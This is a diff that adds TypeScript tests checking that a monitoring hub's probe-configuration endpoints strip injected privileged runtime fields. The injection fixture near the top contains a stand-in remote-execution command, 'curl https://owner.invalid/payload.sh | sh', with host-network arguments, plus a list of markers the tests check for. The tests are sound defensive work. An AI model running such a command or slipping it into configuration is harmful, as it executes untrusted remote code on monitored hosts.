@@ -88,6 +88,68 @@ async function registerProbe(
   return { ...registration, privateKeyPem: identity.privateKeyPem };
 }
 
+const privilegedRuntimeInjectionPayload = {
+  args: ["--network=host", "--timeout=600", "https://owner.invalid/payload"],
+  code: "console.log('owner runtime code')",
+  command: "curl https://owner.invalid/payload.sh | sh",
+  network: "enabled",
+  runtimePolicy: {
+    network: "enabled",
+    timeoutSeconds: 600,
+  },
+  timeoutSeconds: 600,
+};
+
+function expectNoPrivilegedRuntimeInjection(value: unknown) {
+  const serialized = JSON.stringify(value);
+
+  for (const key of [
+    "args",
+    "code",
+    "command",
+    "network",
+    "privilegedRuntime",
+    "runtimePolicy",
+    "timeoutSeconds",
+  ]) {
+    expect(serialized).not.toContain(`"${key}"`);
+  }
+
+  for (const marker of [
+    "--network=host",
+    "--timeout=600",
+    "console.log",
+    "owner.invalid",
+    "payload.sh",
+  ]) {
+    expect(serialized).not.toContain(marker);
+  }
+}
+
+async function fetchProbeConfiguration(
+  app: ReturnType<typeof createHubApp>,
+  registration: Awaited<ReturnType<typeof registerProbe>>,
+  currentVersion: string,
+) {
+  const ConfigurationRequest = root.enoki.v1.ProbeConfigurationRequest;
+  const ConfigurationResponse = root.enoki.v1.ProbeConfigurationResponse;
+  const configBody = ConfigurationRequest.encode(
+    ConfigurationRequest.create({
+      currentVersion,
+      probeId: registration.probeId,
+    }),
+  ).finish();
+  const configResponse = await app.request(
+    "/api/probe/config",
+    signedProbeRequest(registration, "/api/probe/config", configBody),
+  );
+
+  expect(configResponse.status).toBe(200);
+  return ConfigurationResponse.decode(
+    new Uint8Array(await configResponse.arrayBuffer()),
+  );
+}
+
 describe("Probe Configuration API", () => {
   afterEach(async () => {
     await Promise.all(
@@ -210,6 +272,135 @@ describe("Probe Configuration API", () => {
         version: updated.configuration.version,
       }),
     );
+
+    database.close();
+  });
+
+  it("does not let Owner Probe Configuration inject privileged runtime commands or policy", async () => {
+    const database = await createTemporaryDatabase();
+    const app = createHubApp({
+      auth: {
+        failureDelayMs: 0,
+        ownerPassword: "correct horse battery staple",
+        sessionCookieName: "enoki_owner_session",
+      },
+      database,
+      now: () => 1_725_000_020_000,
+    });
+    const ownerSession = await loginOwner(app);
+    const enrollmentToken = await createEnrollmentToken(app, ownerSession);
+    const registration = await registerProbe(app, enrollmentToken);
+
+    const updateResponse = await app.request("/api/web/probe-configuration", {
+      body: JSON.stringify({
+        collectCpu: true,
+        collectDisk: true,
+        collectLoad: true,
+        collectMemory: true,
+        collectNetwork: true,
+        collectUptime: true,
+        metricsCollectionIntervalSeconds: 10,
+        privilegedRuntime: privilegedRuntimeInjectionPayload,
+        ...privilegedRuntimeInjectionPayload,
+        reportingBatchIntervalSeconds: 30,
+      }),
+      headers: {
+        "content-type": "application/json",
+        cookie: ownerSession,
+      },
+      method: "PUT",
+    });
+
+    expect(updateResponse.status).toBe(200);
+    const updated = (await updateResponse.json()) as {
+      configuration: Record<string, unknown>;
+    };
+    expectNoPrivilegedRuntimeInjection(updated.configuration);
+
+    const probeConfiguration = await fetchProbeConfiguration(
+      app,
+      registration,
+      "default-v1",
+    );
+    expectNoPrivilegedRuntimeInjection(probeConfiguration);
+
+    database.close();
+  });
+
+  it("does not let Host Probe Configuration overrides inject privileged runtime commands or policy", async () => {
+    const database = await createTemporaryDatabase();
+    const app = createHubApp({
+      auth: {
+        failureDelayMs: 0,
+        ownerPassword: "correct horse battery staple",
+        sessionCookieName: "enoki_owner_session",
+      },
+      database,
+      now: () => 1_725_000_030_000,
+    });
+    const ownerSession = await loginOwner(app);
+    const enrollmentToken = await createEnrollmentToken(app, ownerSession);
+    const registration = await registerProbe(app, enrollmentToken);
+    const hostsResponse = await app.request("/api/web/hosts", {
+      headers: {
+        cookie: ownerSession,
+      },
+    });
+    const hostId = ((await hostsResponse.json()) as { hosts: { id: number }[] })
+      .hosts[0]?.id;
+
+    const overrideResponse = await app.request(
+      `/api/web/hosts/${hostId}/probe-configuration`,
+      {
+        body: JSON.stringify({
+          configuration: {
+            collectCpu: true,
+            collectDisk: true,
+            collectLoad: true,
+            collectMemory: true,
+            collectNetwork: true,
+            collectUptime: true,
+            metricsCollectionIntervalSeconds: 10,
+            privilegedRuntime: privilegedRuntimeInjectionPayload,
+            ...privilegedRuntimeInjectionPayload,
+            reportingBatchIntervalSeconds: 30,
+          },
+          mode: "override",
+        }),
+        headers: {
+          "content-type": "application/json",
+          cookie: ownerSession,
+        },
+        method: "PUT",
+      },
+    );
+
+    expect(overrideResponse.status).toBe(200);
+    const override = (await overrideResponse.json()) as {
+      configuration: Record<string, unknown>;
+      mode: "override";
+    };
+    expect(override.mode).toBe("override");
+    expectNoPrivilegedRuntimeInjection(override.configuration);
+
+    const effectiveResponse = await app.request(
+      `/api/web/hosts/${hostId}/probe-configuration`,
+      {
+        headers: {
+          cookie: ownerSession,
+        },
+      },
+    );
+    expect(effectiveResponse.status).toBe(200);
+    expectNoPrivilegedRuntimeInjection(await effectiveResponse.json());
+
+    const probeConfiguration = await fetchProbeConfiguration(
+      app,
+      registration,
+      "default-v1",
+    );
+    expect(probeConfiguration.version).toBe(override.configuration.version);
+    expectNoPrivilegedRuntimeInjection(probeConfiguration);
 
     database.close();
   });
